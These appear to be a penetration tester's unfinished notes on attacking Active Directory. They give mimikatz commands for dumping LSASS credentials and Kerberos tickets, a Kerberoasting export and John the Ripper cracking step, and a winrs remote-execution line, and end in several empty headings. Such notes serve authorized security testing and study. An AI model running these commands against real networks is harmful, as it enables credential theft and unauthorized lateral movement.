# Active Directory

When testing active directory our goals should be to:

* gain a foothold on a machine on the domain and elevate our privileges
* enumerate the domain to find additional accounts, users, etc. that ideally increase our privilege level on the domain
* gain access to the domain controller
* persist on the domain (situation dependent)

Assuming that we've already [enumerated](../3.-enumeration/active-directory.md) the domain, we should now be focused on gathering credentials to move laterally within the domain.

### Cached credential retrieval

Several tools are available to help us retrieve stored credentials. My preferred tool is mimikatz.

#### Mimikatz

```
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords (to dump lsass)
sekurlsa::tickets (to dump tickets stored in memory)
kerberos::list (view cached kerberos tickets for the current user)
```

### Service account attacks

#### Kerberoasting

If we find interesting service accounts while enumerating we can use mimikatz to export the tickets for offline cracking.

```
kerberos::list /export
```

We can then use John the Ripper to crack the tickets.

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Alternatively, we canuse the **Invoke-Kerberoast.ps1,** to enumerate SPNs, request tickets, and export them in a format ready for cracking.

### Lateral movement

Moving laterally within a domain is fairly straightforward once you have credentials.

#### Windows remote management

```
winrs -remote:hostname -u:username -p:password (command)
```

#### PS-Remoting

\*\*

#### PS-EXEC



SMB-EXEC



Pass the hash



Overpass the hash



Pass the ticket



### Persistence

Golden tickets
